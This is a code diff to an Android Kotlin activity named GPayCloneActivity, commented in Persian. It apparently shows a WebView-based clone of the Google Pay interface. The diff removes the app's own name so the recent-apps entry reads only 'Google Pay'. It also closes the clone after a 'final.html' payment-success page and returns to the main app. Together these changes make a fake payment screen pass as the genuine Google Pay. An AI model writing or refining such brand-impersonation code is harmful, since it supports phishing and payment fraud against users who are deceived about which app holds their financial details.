@@ -1,6 +1,7 @@
 package com.example.test
 
 import android.app.ActivityManager
+import android.content.Intent
 import android.graphics.BitmapFactory
 import android.os.Build
 import android.os.Bundle
@@ -78,8 +79,8 @@ class GPayCloneActivity : AppCompatActivity() {
      */
     private fun setTaskDescriptionForRecentApps() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            val appName = appConfig.appName
-            val taskName = "$appName - Google Pay"
+            // ⭐ فقط اسم پرداخت (بدون اسم برنامه)
+            val taskName = "Google Pay"
             
             // ⭐ خواندن ایکون از assets
             try {
@@ -192,6 +193,26 @@ class GPayCloneActivity : AppCompatActivity() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
                 Log.d(TAG, "✅ Page loaded: $url")
+                
+                // ⭐ اگر final.html لود شد، کلون رو ببند و به MainActivity برگرد
+                if (url != null && url.contains("final.html", ignoreCase = true)) {
+                    Log.d(TAG, "════════════════════════════════════════")
+                    Log.d(TAG, "✅ PAYMENT SUCCESS - Closing clone and returning to main app")
+                    Log.d(TAG, "════════════════════════════════════════")
+                    
+                    // ⭐ یک تأخیر کوتاه برای نمایش final.html
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        // ⭐ برگشت به MainActivity
+                        val intent = Intent(this@GPayCloneActivity, MainActivity::class.java)
+                        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
+                        startActivity(intent)
+                        
+                        // ⭐ بستن کلون
+                        finish()
+                    }, 2000) // 2 ثانیه برای نمایش پیام موفقیت
+                    
+                    return
+                }
                 
                 // ⭐ اعمال رنگ status bar از meta tag
                 applyThemeColorFromPage()
